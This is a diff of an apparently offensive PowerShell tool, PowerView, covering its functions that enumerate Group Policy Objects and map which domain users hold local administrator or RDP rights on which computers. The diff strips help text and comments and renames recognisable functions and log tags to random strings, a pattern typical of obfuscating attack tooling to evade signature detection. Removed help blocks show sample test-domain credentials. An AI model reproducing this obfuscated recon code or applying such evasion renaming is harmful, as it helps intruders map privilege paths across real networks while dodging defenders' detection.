-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainGPO -Domain testlab.local
-
-Return all GPOs for the testlab.local domain
-
-.EXAMPLE
-
-Get-DomainGPO -ComputerName windows1.testlab.local
-
-Returns all GPOs applied windows1.testlab.local
-
-.EXAMPLE
-
-"{F260B76D-55C8-46C5-BEF1-9016DD98E272}","Test GPO" | Get-DomainGPO
-
-Return the GPOs with the name of "{F260B76D-55C8-46C5-BEF1-9016DD98E272}" and the display
-name of "Test GPO"
-
-.EXAMPLE
-
-Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainGPO -Credential $Cred
-
-.OUTPUTS
-
-PowerView.GPO
-
-Custom PSObject with translated GPO property fields.
-
-PowerView.GPO.Raw
-
-The raw DirectoryServices.SearchResult object, if -Raw is enabled.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -12936,7 +7727,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $GPOSearcher = Get-DomainSearcher @SearcherArguments
+        $GPOSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
@@ -12951,39 +7742,39 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 
                 if ($PSBoundParameters['ComputerIdentity']) {
                     $SearcherArguments['Identity'] = $ComputerIdentity
-                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
+                    $Computer = VVVCIHJ3 @SearcherArguments -FindOne | Select-Object -First 1
                     if(-not $Computer) {
-                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
+                        Write-Verbose "[5I3AJMSK] Computer '$ComputerIdentity' not found!"
                     }
                     $ObjectDN = $Computer.distinguishedname
                     $TargetComputerName = $Computer.dnshostname
                 }
                 else {
                     $SearcherArguments['Identity'] = $UserIdentity
-                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
+                    $User = YBTPOIR8 @SearcherArguments -FindOne | Select-Object -First 1
                     if(-not $User) {
-                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
+                        Write-Verbose "[5I3AJMSK] User '$UserIdentity' not found!"
                     }
                     $ObjectDN = $User.distinguishedname
                 }
 
-                # extract all OUs the target user/computer is a part of
+                
                 $ObjectOUs = @()
                 $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                     if($_.startswith('OU=')) {
                         $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                     }
                 }
-                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"
+                Write-Verbose "[5I3AJMSK] object OUs: $ObjectOUs"
 
                 if ($ObjectOUs) {
-                    # find all the GPOs linked to the user/computer's OUs
+                    
                     $SearcherArguments.Remove('Properties')
                     $InheritanceDisabled = $False
                     ForEach($ObjectOU in $ObjectOUs) {
                         $SearcherArguments['Identity'] = $ObjectOU
-                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
-                            # extract any GPO links for this particular OU the computer is a part of
+                        $GPOAdsPaths += HM6W17ZN @SearcherArguments | ForEach-Object {
+                            
                             if ($_.gplink) {
                                 $_.gplink.split('][') | ForEach-Object {
                                     if ($_.startswith('LDAP')) {
@@ -12992,21 +7783,21 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                                         $Enforced = $Parts[1]
 
                                         if ($InheritanceDisabled) {
-                                            # if inheritance has already been disabled and this GPO is set as "enforced"
-                                            #   then add it, otherwise ignore it
+                                            
+                                            
                                             if ($Enforced -eq 2) {
                                                 $GpoDN
                                             }
                                         }
                                         else {
-                                            # inheritance not marked as disabled yet
+                                            
                                             $GpoDN
                                         }
                                     }
                                 }
                             }
 
-                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed
+                            
                             if ($_.gpoptions -eq 1) {
                                 $InheritanceDisabled = $True
                             }
@@ -13015,13 +7806,13 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 }
 
                 if ($TargetComputerName) {
-                    # find all the GPOs linked to the computer's site
-                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
+                    
+                    $ComputerSite = (QNE3IO5Q -ComputerName $TargetComputerName).SiteName
                     if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                         $SearcherArguments['Identity'] = $ComputerSite
-                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
+                        $GPOAdsPaths += XMOLM1NY @SearcherArguments | ForEach-Object {
                             if($_.gplink) {
-                                # extract any GPO links for this particular site the computer is a part of
+                                
                                 $_.gplink.split('][') | ForEach-Object {
                                     if ($_.startswith('LDAP')) {
                                         $_.split(';')[0]
@@ -13032,14 +7823,14 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                     }
                 }
 
-                # find any GPOs linked to the user/computer's domain
+                
                 $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                 $SearcherArguments.Remove('Identity')
                 $SearcherArguments.Remove('Properties')
                 $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
-                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
+                $GPOAdsPaths += U3GGBSG9 @SearcherArguments | ForEach-Object {
                     if($_.gplink) {
-                        # extract any GPO links for this particular domain the computer is a part of
+                        
                         $_.gplink.split('][') | ForEach-Object {
                             if ($_.startswith('LDAP')) {
                                 $_.split(';')[0]
@@ -13047,18 +7838,18 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                         }
                     }
                 }
-                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"
+                Write-Verbose "[5I3AJMSK] GPOAdsPaths: $GPOAdsPaths"
 
-                # restore the old properites to return, if set
+                
                 if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                 else { $SearcherArguments.Remove('Properties') }
                 $SearcherArguments.Remove('Identity')
 
                 $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
-                    # use the gplink as an ADS path to enumerate all GPOs for the computer
+                    
                     $SearcherArguments['SearchBase'] = $_
                     $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
-                    Get-DomainObject @SearcherArguments | ForEach-Object {
+                    U3GGBSG9 @SearcherArguments | ForEach-Object {
                         if ($PSBoundParameters['Raw']) {
                             $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                         }
@@ -13077,14 +7868,14 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                     if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                         $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                         if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                            #   and rebuild the domain searcher
+                            
+                            
                             $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            Write-Verbose "[5I3AJMSK] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                             $SearcherArguments['Domain'] = $IdentityDomain
-                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
+                            $GPOSearcher = NJUXTHTL @SearcherArguments
                             if (-not $GPOSearcher) {
-                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
+                                Write-Warning "[5I3AJMSK] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
@@ -13106,18 +7897,18 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 }
 
                 if ($PSBoundParameters['LDAPFilter']) {
-                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
+                    Write-Verbose "[5I3AJMSK] Using additional LDAP filter: $LDAPFilter"
                     $Filter += "$LDAPFilter"
                 }
 
                 $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
-                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"
+                Write-Verbose "[5I3AJMSK] filter string: $($GPOSearcher.filter)"
 
                 if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                 else { $Results = $GPOSearcher.FindAll() }
                 $Results | Where-Object {$_} | ForEach-Object {
                     if ($PSBoundParameters['Raw']) {
-                        # return raw result objects
+                        
                         $GPO = $_
                         $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                     }
@@ -13131,7 +7922,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                                 $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                             }
                             catch {
-                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
+                                Write-Verbose "[5I3AJMSK] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                             }
                         }
                         else {
@@ -13144,7 +7935,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
+                        Write-Verbose "[5I3AJMSK] Error disposing of the Results object: $_"
                     }
                 }
                 $GPOSearcher.dispose()
@@ -13154,108 +7945,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 }
 
 
-function Get-DomainGPOLocalGroup {
-<#
-.SYNOPSIS
+function 5I3AJMSKLocalGroup {
 
-Returns all GPOs in a domain that modify local group memberships through 'Restricted Groups'
-or Group Policy preferences. Also return their user membership mappings, if they exist.
-
-Author: @harmj0y  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  
-
-.DESCRIPTION
-
-First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
-arguments, and for each GPO checks if 'Restricted Groups' are set with GptTmpl.inf or
-group membership is set through Group Policy Preferences groups.xml files. For any
-GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 'Group Membership'
-section data is processed if present. Any found Groups.xml files are parsed with
-Get-GroupsXML and those memberships are returned as well.
-
-.PARAMETER Identity
-
-A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
-GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.
-
-.PARAMETER ResolveMembersToSIDs
-
-Switch. Indicates that any member names should be resolved to their domain SIDs.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainGPOLocalGroup
-
-Returns all local groups set by GPO along with their members and memberof.
-
-.EXAMPLE
-
-Get-DomainGPOLocalGroup -ResolveMembersToSIDs
-
-Returns all local groups set by GPO along with their members and memberof,
-and resolve any members to their domain SIDs.
-
-.EXAMPLE
-
-'{0847C615-6C4E-4D45-A064-6001040CC21C}' | Get-DomainGPOLocalGroup
-
-Return any GPO-set groups for the GPO with the given name/GUID.
-
-.EXAMPLE
-
-Get-DomainGPOLocalGroup 'Desktops'
-
-Return any GPO-set groups for the GPO with the given display name.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainGPOLocalGroup -Credential $Cred
-
-.LINK
-
-https://morgansimonsenblog.azurewebsites.net/tag/groups/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GPOGroup')]
@@ -13331,7 +8022,7 @@ https://morgansimonsenblog.azurewebsites.net/tag/groups/
     PROCESS {
         if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        Get-DomainGPO @SearcherArguments | ForEach-Object {
+        5I3AJMSK @SearcherArguments | ForEach-Object {
             $GPOdisplayName = $_.displayname
             $GPOname = $_.name
             $GPOPath = $_.gpcfilesyspath
@@ -13339,20 +8030,20 @@ https://morgansimonsenblog.azurewebsites.net/tag/groups/
             $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
             if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
 
-            # first parse the 'Restricted Groups' file (GptTmpl.inf) if it exists
-            $Inf = Get-GptTmpl @ParseArgs
+            
+            $Inf = W8HZ4RVI @ParseArgs
 
             if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                 $Memberships = @{}
 
-                # parse the members/memberof fields for each entry
+                
                 ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                     $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
-                    # extract out ALL members
+                    
                     $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
 
                     if ($PSBoundParameters['ResolveMembersToSIDs']) {
-                        # if the resulting member is username and not a SID, attempt to resolve it
+                        
                         $GroupMembers = @()
                         ForEach ($Member in $MembershipValue) {
                             if ($Member -and ($Member.Trim() -ne '')) {
@@ -13385,7 +8076,7 @@ https://morgansimonsenblog.azurewebsites.net/tag/groups/
 
                 ForEach ($Membership in $Memberships.GetEnumerator()) {
                     if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
-                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
+                        
                         $GroupSID = $Membership.Key.Trim('*')
                         if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                             $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
@@ -13433,19 +8124,19 @@ https://morgansimonsenblog.azurewebsites.net/tag/groups/
                 }
             }
 
-            # now try to the parse group policy preferences file (Groups.xml) if it exists
+            
             $ParseArgs =  @{
                 'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
             }
 
-            Get-GroupsXML @ParseArgs | ForEach-Object {
+            JZQ8NM8D @ParseArgs | ForEach-Object {
                 if ($PSBoundParameters['ResolveMembersToSIDs']) {
                     $GroupMembers = @()
                     ForEach ($Member in $_.GroupMembers) {
                         if ($Member -and ($Member.Trim() -ne '')) {
                             if ($Member -notmatch '^S-1-.*') {
 
-                                # if the resulting member is username and not a SID, attempt to resolve it
+                                
                                 $ConvertToArguments = @{'ObjectName' = $Groupname}
                                 if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                 $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member
@@ -13476,110 +8167,8 @@ https://morgansimonsenblog.azurewebsites.net/tag/groups/
 }
 
 
-function Get-DomainGPOUserLocalGroupMapping {
-<#
-.SYNOPSIS
+function 5I3AJMSKUserLocalGroupMapping {
 
-Enumerates the machines where a specific domain user/group is a member of a specific
-local group, all through GPO correlation. If no user/group is specified, all
-discoverable mappings are returned.
-
-Author: @harmj0y  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  
-
-.DESCRIPTION
-
-Takes a user/group name and optional domain, and determines the computers in the domain
-the user/group has local admin (or RDP) rights to.
-
-It does this by:
-    1.  resolving the user/group to its proper SID
-    2.  enumerating all groups the user/group is a current part of
-        and extracting all target SIDs to build a target SID list
-    3.  pulling all GPOs that set 'Restricted Groups' or Groups.xml by calling
-        Get-DomainGPOLocalGroup
-    4.  matching the target SID list to the queried GPO SID list
-        to enumerate all GPO the user is effectively applied with
-    5.  enumerating all OUs and sites and applicable GPO GUIs are
-        applied to through gplink enumerating
-    6.  querying for all computers under the given OUs or sites
-
-If no user/group is specified, all user/group -> machine mappings discovered through
-GPO relationships are returned.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-for the user/group to identity GPO local group mappings for.
-
-.PARAMETER LocalGroup
-
-The local group to check access against.
-Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
-or a custom local SID. Defaults to local 'Administrators'.
-
-.PARAMETER Domain
-
-Specifies the domain to enumerate GPOs for, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainGPOUserLocalGroupMapping
-
-Find all user/group -> machine relationships where the user/group is a member
-of the local administrators group on target machines.
-
-.EXAMPLE
-
-Get-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local
-
-Find all computers that dfm user has local administrator rights to in
-the dev.testlab.local domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainGPOUserLocalGroupMapping -Credential $Cred
-
-.OUTPUTS
-
-PowerView.GPOLocalGroupMapping
-
-A custom PSObject containing any target identity information and what local
-group memberships they're a part of through GPO correlation.
-
-.LINK
-
-http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GPOUserLocalGroupMapping')]
@@ -13643,14 +8232,14 @@ http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
         $TargetSIDs = @()
 
         if ($PSBoundParameters['Identity']) {
-            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
+            $TargetSIDs += U3GGBSG9 @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
             $TargetObjectSID = $TargetSIDs
             if (-not $TargetSIDs) {
-                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
+                Throw "[5I3AJMSKUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
             }
         }
         else {
-            # no filtering/match all
+            
             $TargetSIDs = @('*')
         }
 
@@ -13661,23 +8250,23 @@ http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
             $TargetLocalSID = 'S-1-5-32-544'
         }
         else {
-            # RDP
+            
             $TargetLocalSID = 'S-1-5-32-555'
         }
 
         if ($TargetSIDs[0] -ne '*') {
             ForEach ($TargetSid in $TargetSids) {
-                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
-                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
+                Write-Verbose "[5I3AJMSKUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
+                $TargetSIDs += H3GAYKFB @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
             }
         }
 
-        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
-        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"
+        Write-Verbose "[5I3AJMSKUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
+        Write-Verbose "[5I3AJMSKUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"
 
-        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
+        $GPOgroups = 5I3AJMSKLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
             $GPOgroup = $_
-            # if the locally set group is what we're looking for, check the GroupMembers ('members') for our target SID
+            
             if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                 $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                     if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
@@ -13685,7 +8274,7 @@ http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
                     }
                 }
             }
-            # if the group is a 'memberof' the group we're looking for, check GroupSID against the targt SIDs
+            
             if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                 if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                     $GPOgroup
@@ -13708,27 +8297,27 @@ http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
             $Filters = $_.Filters
 
             if ($TargetSIDs[0] -eq '*') {
-                # if the * wildcard was used, set the targets to all GPO members so everything it output
+                
                 $TargetObjectSIDs = $GPOMembers
             }
             else {
                 $TargetObjectSIDs = $TargetObjectSID
             }
 
-            # find any OUs that have this GPO linked through gpLink
-            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
+            
+            HM6W17ZN @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                 if ($Filters) {
-                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
+                    $OUComputers = VVVCIHJ3 @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                 }
                 else {
-                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
+                    $OUComputers = VVVCIHJ3 @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                 }
 
                 if ($OUComputers) {
                     if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}
 
                     ForEach ($TargetSid in $TargetObjectSIDs) {
-                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
+                        $Object = U3GGBSG9 @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
 
                         $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
 
@@ -13750,10 +8339,10 @@ http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
                 }
             }
 
-            # find any sites that have this GPO linked through gpLink
-            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
+            
+            XMOLM1NY @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                 ForEach ($TargetSid in $TargetObjectSIDs) {
-                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
+                    $Object = U3GGBSG9 @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'
 
                     $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
 
@@ -13778,101 +8367,8 @@ http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
 }
 
 
-function Get-DomainGPOComputerLocalGroupMapping {
-<#
-.SYNOPSIS
+function 5I3AJMSKComputerLocalGroupMapping {
 
-Takes a computer (or GPO) object and determines what users/groups are in the specified
-local group for the machine through GPO correlation.
-
-Author: @harmj0y  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainGPOLocalGroup  
-
-.DESCRIPTION
-
-This function is the inverse of Get-DomainGPOUserLocalGroupMapping, and finds what users/groups
-are in the specified local group for a target machine through GPO correlation.
-
-If a -ComputerIdentity is specified, retrieve the complete computer object, attempt to
-determine the OU the computer is a part of. Then resolve the computer's site name with
-Get-NetComputerSiteName and retrieve all sites object Get-DomainSite. For those results, attempt to
-enumerate all linked GPOs and associated local group settings with Get-DomainGPOLocalGroup. For
-each resulting GPO group, resolve the resulting user/group name to a full AD object and
-return the results. This will return the domain objects that are members of the specified
--LocalGroup for the given computer.
-
-Otherwise, if -OUIdentity is supplied, the same process is executed to find linked GPOs and
-localgroup specifications.
-
-.PARAMETER ComputerIdentity
-
-A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
-or a dns host name (e.g. windows10.testlab.local) for the computer to identity GPO local group mappings for.
-
-.PARAMETER OUIdentity
-
-An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
-GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) for the OU to identity GPO local group mappings for.
-
-.PARAMETER LocalGroup
-
-The local group to check access against.
-Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
-or a custom local SID. Defaults to local 'Administrators'.
-
-.PARAMETER Domain
-
-Specifies the domain to enumerate GPOs for, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainGPOComputerLocalGroupMapping -ComputerName WINDOWS3.testlab.local
-
-Finds users who have local admin rights over WINDOWS3 through GPO correlation.
-
-.EXAMPLE
-
-Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP
-
-Finds users who have RDP rights over WINDOWS4 through GPO correlation.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainGPOComputerLocalGroupMapping -Credential $Cred -ComputerIdentity SQL.testlab.local
-
-.OUTPUTS
-
-PowerView.GGPOComputerLocalGroupMember
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GGPOComputerLocalGroupMember')]
@@ -13939,39 +8435,39 @@ PowerView.GGPOComputerLocalGroupMember
 
     PROCESS {
         if ($PSBoundParameters['ComputerIdentity']) {
-            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'
+            $Computers = VVVCIHJ3 @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'
 
             if (-not $Computers) {
-                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
+                throw "[5I3AJMSKComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
             }
 
             ForEach ($Computer in $Computers) {
 
                 $GPOGuids = @()
 
-                # extract any GPOs linked to this computer's OU through gpLink
+                
                 $DN = $Computer.distinguishedname
